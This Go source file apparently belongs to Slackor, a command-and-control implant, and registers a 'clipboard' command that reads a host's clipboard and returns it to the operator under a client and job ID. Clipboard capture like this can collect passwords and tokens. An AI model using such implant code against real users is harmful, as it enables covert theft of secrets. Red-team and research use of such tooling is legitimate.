package common

import (
	"github.com/atotto/clipboard"
	"github.com/n00py/Slackor/pkg/command"
)

// Clipboard reads the clipboard
type Clipboard struct{}

// Name is the name of the command
func (c Clipboard) Name() string {
	return "clipboard"
}

// Run reads the clipboard
func (c Clipboard) Run(clientID string, jobID string, args []string) (string, error) {
	return clipboard.ReadAll()
}

func init() {
	command.RegisterCommand(Clipboard{})
}
